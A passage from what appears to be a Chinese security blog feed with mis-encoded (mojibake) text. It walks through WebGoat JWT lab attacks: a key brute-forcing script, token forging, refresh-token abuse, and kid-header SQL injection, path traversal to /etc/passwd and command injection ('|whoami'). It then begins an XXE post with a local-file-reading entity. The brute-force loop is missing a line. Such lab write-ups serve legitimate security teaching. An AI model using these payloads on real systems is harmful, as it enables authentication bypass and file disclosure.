class_">InvalidTokenException</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®ç‚¹åœ¨äº</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨äº†é”™è¯¯çš„å‡½æ•°<code>parse(accessToken)</code>ï¼Œè€Œä¸æ˜¯<code>parseClaimsJws(accessToken)</code>ï¼Œå¯¼è‡´jwtéªŒè¯æˆåŠŸ</p><p>æ­£å¸¸æƒ…å†µä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken);</span><br></pre></td></tr></table></figure><ul><li><code>Jwts.parser()</code> åˆ›å»ºäº†ä¸€ä¸ª<code>JwtParser</code>ç±»çš„å®ä¾‹ï¼Œç”¨äºè§£æå’ŒéªŒè¯JWTã€‚</li><li><code>setSigningKey(JWT_PASSWORD)</code> è®¾ç½®ç”¨äºç­¾åJWTçš„å¯†é’¥ã€‚<code>JWT_PASSWORD</code>å˜é‡åº”åŒ…å«ç”¨äºç­¾åJWTçš„ç›¸åŒå¯†é’¥ã€‚</li><li><code>parseClaimsJws(accessToken)</code> è§£æåŒ…å«åœ¨<code>accessToken</code>å˜é‡ä¸­çš„JWTï¼Œå¹¶å°†å…¶ä½œä¸º<code>Jws&lt;Claims&gt;</code>å¯¹è±¡è¿”å›ã€‚<code>Claims</code>å¯¹è±¡åŒ…å«JWTçš„æœ‰æ•ˆè´Ÿè½½ï¼Œé€šå¸¸åŒ…æ‹¬å…³äºç”¨æˆ·çš„ä¿¡æ¯ä»¥åŠæˆæƒè¯·æ±‚æ‰€éœ€çš„ä»»ä½•å…¶ä»–æ•°æ®ã€‚</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä½¿ç”¨æä¾›çš„å¯†é’¥æ— æ³•éªŒè¯JWTï¼Œåˆ™<code>parseClaimsJws()</code>æ–¹æ³•å°†æŠ›å‡º<code>SignatureException</code>ã€‚</p><h3 id="çˆ†ç ´å¯†é’¥â€“ä¿®æ”¹ç­¾å"><a href="#çˆ†ç ´å¯†é’¥â€“ä¿®æ”¹ç­¾å" class="headerlink" title="çˆ†ç ´å¯†é’¥â€“ä¿®æ”¹ç­¾å"></a>çˆ†ç ´å¯†é’¥â€“ä¿®æ”¹ç­¾å</h3><p>WebGoat JWT 10</p><p>å·¥å…·</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./jwtcrack JWTæ•°æ®</span><br><span class="line">hashcat</span><br></pre></td></tr></table></figure><p>pythonè„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    1.è‹¥ç­¾åç›´æ¥æ ¡éªŒæˆåŠŸï¼Œåˆ™ key_ ä¸ºæœ‰æ•ˆå¯†é’¥ï¼›</span></span><br><span class="line"><span class="string">    2.è‹¥å› æ•°æ®éƒ¨åˆ†é¢„å®šä¹‰å­—æ®µé”™è¯¯ï¼ˆjwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureErrorï¼‰å¯¼è‡´æ ¡éªŒå¤±è´¥ï¼Œè¯´æ˜å¹¶éå¯†é’¥é”™è¯¯å¯¼è‡´ï¼Œåˆ™ key_ ä¹Ÿä¸ºæœ‰æ•ˆå¯†é’¥ï¼›</span></span><br><span class="line"><span class="string">    3.è‹¥å› å¯†é’¥é”™è¯¯ï¼ˆjwt.exceptions.InvalidSignatureErrorï¼‰å¯¼è‡´æ ¡éªŒå¤±è´¥ï¼Œåˆ™ key_ ä¸ºæ— æ•ˆå¯†é’¥ï¼›</span></span><br><span class="line"><span class="string">    4.è‹¥ä¸ºå…¶ä»–åŸå› ï¼ˆå¦‚ï¼ŒJWT å­—ç¬¦ä¸²æ ¼å¼é”™è¯¯ï¼‰å¯¼è‡´æ ¡éªŒå¤±è´¥ï¼Œæ ¹æœ¬æ— æ³•éªŒè¯å½“å‰ key_ æ˜¯å¦æœ‰æ•ˆã€‚</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="comment">#import termcolor</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># æç¤ºé‡Œç»™çš„å­—å…¸https://github.com/first20hours/google-10000-english</span></span><br><span class="line">dict_path = <span class="string">&#x27;path/10000_en_words.txt&#x27;</span></span><br><span class="line">JWT_STR = <span class="string">R&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.m-jSyfYEsVzD3CBI6N39wZ7AcdKdp_GiO7F_Ym12u-0&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jwt_str = JWT_STR</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dict_path) <span class="keyword">as</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                <span class="comment">#print(&#x27;\r&#x27;, &#x27;\bbingo! found key --&gt;&#x27;, termcolor.colored(key_, &#x27;green&#x27;), &#x27;&lt;--&#x27;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;the key is [&#x27;</span>,key_,<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="comment">#print(&#x27;\r&#x27;, &#x27;\bbingo! found key --&gt;&#x27;, termcolor.colored(key_, &#x27;green&#x27;), &#x27;&lt;--&#x27;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;the key is [&#x27;</span>,key_,<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span class="string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bsorry! no key be found.&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607191917485.png" alt="image-20230607191917485"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;WebGoat Token Builder&quot;</span>,</span><br><span class="line">  <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1686136171</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1786136231</span>,   <span class="comment"># ä¿®æ”¹jwtåˆ°æœŸæ—¶é—´</span></span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;tom@webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;WebGoat&quot;</span>, <span class="comment"># æŒ‰é¢˜ç›®è¦æ±‚ä¿®æ”¹åå­—</span></span><br><span class="line">  <span class="string">&quot;Email&quot;</span>: <span class="string">&quot;tom@webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Role&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;Manager&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Project Administrator&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">,algorithm=<span class="string">&quot;HS256&quot;</span>,key=<span class="string">&quot;available&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„tokenæäº¤å³å¯</p><p><img src="/../images/image-20230607192326261.png" alt="image-20230607192326261"></p><h3 id="è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œ"><a href="#è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œ" class="headerlink" title="è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œ"></a>è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œ</h3><h4 id="å½¢æˆåŸå› -1"><a href="#å½¢æˆåŸå› -1" class="headerlink" title="å½¢æˆåŸå› "></a><strong>å½¢æˆåŸå› </strong></h4><p>æœªæ ¡éªŒaccess tokenå’Œrefresh tokenæ˜¯å¦å±äºåŒä¸€ä¸ªç”¨æˆ·ï¼Œå¯¼è‡´Aç”¨æˆ·å¯ä½¿ç”¨è‡ªå·±çš„refresh tokenå»åˆ·æ–°Bç”¨æˆ·çš„access token</p><h4 id="å®éªŒ-1"><a href="#å®éªŒ-1" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h4><p>WebGoat JWT 12</p><p>é¢˜ç›®ç»™å‡ºäº†Tomçš„æ—§token</p><p><img src="/../images/image-20230608205636773.png" alt="image-20230608205636773"></p><p>ç”¨jerryè®¿é—®å¾—åˆ°refresh tokenï¼ˆå¯†ç åœ¨æºç é‡Œï¼‰</p><p><img src="/../images/image-20230608205424807.png" alt="image-20230608205424807"></p><p>ç”¨jerryçš„refresh token å»åˆ·æ–°Tomçš„access token</p><p><img src="/../images/image-20230608210421439.png" alt="image-20230608210421439"></p><p>å¸¦ä¸Šå¾—åˆ°çš„accesstokenï¼Œå»è´­ç‰©</p><p><img src="/../images/image-20230608210205494.png" alt="image-20230608210205494"></p><h4 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a><strong>ä¿®å¤</strong></h4><p>è·Ÿè¸ªå“ªä¸ªaccess tokenå±äºå“ªä¸ªrefresh token,è¿˜å¯ä»¥æ£€æŸ¥ç”¨æˆ·çš„IPåœ°å€æˆ–åœ°ç†ä½ç½®ã€‚</p><h3 id="æ—§JWTå¤ç”¨"><a href="#æ—§JWTå¤ç”¨" class="headerlink" title="æ—§JWTå¤ç”¨"></a>æ—§JWTå¤ç”¨</h3><p>è¿˜æ˜¯WebGoat JWT 12</p><p><img src="/../images/image-20230607193350002.png" alt="image-20230607193350002"></p><p><img src="/../images/image-20230607193221271.png" alt="image-20230607193221271"></p><h3 id="KIDæ³¨å…¥"><a href="#KIDæ³¨å…¥" class="headerlink" title="KIDæ³¨å…¥"></a>KIDæ³¨å…¥</h3><p>WebGoat JWT 13</p><p>æŸ¥çœ‹å¯¹åº”æºç </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span>Jwts.parser().setSigningKeyResolver(<span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line">                        xxxxxxx</span><br><span class="line">                    &#125;).parseClaimsJws(token);</span><br><span class="line"><span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;Jerry&quot;</span>.equals(username)) &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-final-jerry-account&quot;</span>).build();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;Tom&quot;</span>.equals(username)) &#123;</span><br><span class="line">    <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-final-not-tom&quot;</span>).build();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).output(e.toString()).build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘ï¼šè·å–å¯†é’¥ï¼Œç„¶åè§£ætokenï¼Œè·å¾—claimsä¸­çš„usernameï¼Œå¦‚æœä¸ºTomåˆ™åˆ é™¤æˆåŠŸã€‚</p><p><strong>å…³é”®</strong>ï¼šè·å–å¯†é’¥çš„éƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] resolveSigningKeyBytes(JwsHeader header, Claims claims) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">kid</span> <span class="operator">=</span> (String) header.get(<span class="string">&quot;kid&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">var</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection()) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// é€šè¿‡æŸ¥è¯¢kidæ¥è·å¾—keyï¼Œå¾ˆæ˜æ˜¾å­˜åœ¨sqlæ³¨å…¥</span></span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span>connection.createStatement().executeQuery(<span class="string">&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot;</span> + kid + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">      </span><br><span class="line">            <span class="keyword">while</span> (rs.next()) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// è¿”å›base64è§£ç åçš„key</span></span><br><span class="line">            <span class="keyword">return</span> TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">catch</span> (SQLException e) </span><br><span class="line">        &#123;</span><br><span class="line">            errorMessage[<span class="number">0</span>] = e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£å¸¸çš„æ€è·¯æ˜¯é€šè¿‡å¯¹kidå‚æ•°è¿›è¡Œsqlæ³¨å…¥ï¼Œä¼ªé€ key</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> key <span class="keyword">FROM</span> jwt_keys <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;&quot; + kid + &quot;&#x27;</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºTomçš„jwtä¸­kidä¸º<code>webgoat_key</code>ï¼Œè¯´æ˜åœ¨jwt_keysè¡¨ä¸­æœ‰ä¸€ä¸ªidçš„å€¼ä¸º<code>webgoat_key</code>ã€‚</p><p>æ‰€ä»¥å¯ä»¥å¯¹kidæ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kid: y<span class="string">&#x27; and 1=2 union select id from jwt_keys where id =&#x27;</span>webgoat_key</span><br></pre></td></tr></table></figure><p>è¿™æ ·sqlæŸ¥è¯¢çš„ç»“æœå°±ä¸º<code>webgoat_key</code>ï¼Œå³keyä¸º<code>webgoat_key</code>ï¼Œä½†æ˜¯å› ä¸º</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>æ— æ³•å¯¹<code>webgoat_key</code>è¿›è¡Œbase64è§£ç ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><p>ç”¨<code>webgoat_key</code>ä½œä¸ºkey</p><p><img src="/../images/image-20230608204646391.png" alt="image-20230608204646391"></p><p>é€šè¿‡æºç å¾—åˆ°çœŸæ­£çš„keyä¸º</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = base64.b64decode(<span class="string">&quot;qwertyqwerty1234&quot;</span>)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">token_dict = &#123;</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1529569536</span>,</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;WebGoat Token Builder&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">2018905304</span>,</span><br><span class="line">    <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;webgoat.org&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;jerry@webgoat.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;Tom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Email&quot;</span>: <span class="string">&quot;jerry@webgoat.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Role&quot;</span>: [<span class="string">&quot;Cat&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">key = base64.b64decode(<span class="string">&quot;qwertyqwerty1234&quot;</span>)</span><br><span class="line"><span class="comment"># headers</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">    <span class="comment"># &quot;kid&quot;: &quot;123&#x27; and 1=2 union select id FROM jwt_keys WHERE id=&#x27;webgoat_key&quot;,</span></span><br><span class="line">    <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;webgoat_key&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># è°ƒç”¨jwtåº“,ç”Ÿæˆjson web token</span></span><br><span class="line">jwt_token = jwt.encode(payload=token_dict,  <span class="comment"># payload, æœ‰æ•ˆè½½ä½“</span></span><br><span class="line">                       key=key,  <span class="comment"># è¿›è¡ŒåŠ å¯†ç­¾åçš„å¯†é’¥</span></span><br><span class="line">                       algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># æŒ‡æ˜ç­¾åç®—æ³•æ–¹å¼, é»˜è®¤ä¹Ÿæ˜¯HS256</span></span><br><span class="line">                       headers=headers  <span class="comment"># json web token æ•°æ®ç»“æ„åŒ…å«ä¸¤éƒ¨åˆ†, payload(æœ‰æ•ˆè½½ä½“), headers(æ ‡å¤´)</span></span><br><span class="line">                       ).decode(<span class="string">&#x27;ascii&#x27;</span>)  <span class="comment"># python3 ç¼–ç åå¾—åˆ° bytes, å†è¿›è¡Œè§£ç (æŒ‡æ˜è§£ç çš„æ ¼å¼), å¾—åˆ°ä¸€ä¸ªstr</span></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230608204947847.png" alt="image-20230608204947847"></p><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>é€‰æ‹©å“ªç§æ–¹æ³•ï¼Œå–å†³äºåç«¯æ˜¯å¦‚ä½•åˆ©ç”¨kidæ¥æ‰¾åˆ°å¯¹åº”å¯†é’¥</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#ç›®å½•éå†</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">#sqlæ³¨å…¥</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;-- &quot;</span></span><br><span class="line">#å‘½ä»¤æ‰§è¡Œ</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;/path/to/key_file|whoami&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç­¾åç®—æ³•æ›´æ”¹ä¸ºå¯¹ç§°åŠ å¯†"><a href="#ç­¾åç®—æ³•æ›´æ”¹ä¸ºå¯¹ç§°åŠ å¯†" class="headerlink" title="ç­¾åç®—æ³•æ›´æ”¹ä¸ºå¯¹ç§°åŠ å¯†"></a>ç­¾åç®—æ³•æ›´æ”¹ä¸ºå¯¹ç§°åŠ å¯†</h3><p>JWTä¸­æœ€å¸¸ç”¨çš„ä¸¤ç§ç®—æ³•ä¸º<code>HMAC</code>å’Œ<code>RSA</code></p><blockquote><p>HMAC(HS256):æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨ç§˜å¯†å¯†é’¥å¯¹æ¯æ¡æ¶ˆæ¯è¿›è¡Œç­¾åå’ŒéªŒè¯<br>RSA(RS256)ï¼šæ˜¯ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨ç§é’¥åŠ å¯†æ˜æ–‡ï¼Œå…¬é’¥è§£å¯†å¯†æ–‡ã€‚</p></blockquote><p>å¦‚æœå¯¹æ–¹ç½‘ç«™åŸæ¥ä½¿ç”¨çš„æ˜¯RS256ï¼Œä½†æ˜¯æ³„éœ²äº†å…¬é’¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥å…¬é’¥ç”Ÿæˆç­¾åï¼Œå¹¶ä¸”å°†algçš„å€¼æ”¹ä¸ºHS256ï¼Œå› ä¸ºHS256ä¸ºå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œæ‰€ä»¥ç½‘ç«™å°±ä¼šä½¿ç”¨è¯¥å…¬é’¥éªŒè¯ç­¾åï¼Œè‡ªç„¶ç­¾åå¯ä»¥é€šè¿‡éªŒè¯ã€‚</p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://jwt.io/introduction">https://jwt.io/introduction</a></p><p><a href="http://www.xianxianlabs.com/blog/2018/06/03/96.html">http://www.xianxianlabs.com/blog/2018/06/03/96.html</a></p><p><a href="https://www.freebuf.com/vuls/216457.html">https://www.freebuf.com/vuls/216457.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2023/06/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE/"/>
      <url>/2023/06/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE/</url>
      
        <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><ol><li><p>å®šä¹‰</p><blockquote><p>XMLæ˜¯å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆeXtensible Markup Languageï¼‰çš„ç¼©å†™ï¼Œå®ƒæ˜¯æ˜¯ä¸€ç§æ•°æ®è¡¨ç¤ºæ ¼å¼ï¼Œå¯ä»¥æè¿°éå¸¸ å¤æ‚çš„æ•°æ®ç»“æ„ï¼Œå¸¸ç”¨äºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚</p></blockquote></li><li><p>ä¸htmlçš„è”ç³»å’ŒåŒºåˆ«</p><ul><li>HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®</li><li>XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®</li></ul><blockquote><p>å¯¹ XML æœ€å¥½çš„æè¿°æ˜¯ï¼š</p><p><strong>XML æ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…·ã€‚</strong></p></blockquote></li><li><p>è¯­æ³•</p><p><img src="/../images/image-20220804165043284-1686034515882.png" alt="image-20220804165043284"></p></li><li><p>æ ¼å¼</p><ul><li><p>XMLå£°æ˜ï¼šç‰ˆæœ¬ï¼Œç¼–ç ä¿¡æ¯ï¼ˆå¯é€‰ï¼Œå¦‚æœå­˜åœ¨å°±å¿…é¡»æ”¾åœ¨æ–‡æ¡£çš„é¦–è¡Œï¼‰</p></li><li><p>DTD:Document Type Definition å³æ–‡æ¡£ç±»å‹å®šä¹‰ (å¯é€‰)</p></li><li><p>æ–‡æ¡£å…ƒç´ </p></li><li><p>å…¸å‹xmlæ–‡æ¡£ä¾‹å­</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="comment">&lt;!--XMLå£°æ˜--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTDï¼Œè¿™éƒ¨åˆ†å¯é€‰çš„--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804155703432-1686034515883.png" alt="image-20220804155703432"></p></li></ul></li></ol><h2 id="DTDä¸å®ä½“"><a href="#DTDä¸å®ä½“" class="headerlink" title="DTDä¸å®ä½“"></a>DTDä¸å®ä½“</h2><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><blockquote><p>DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD 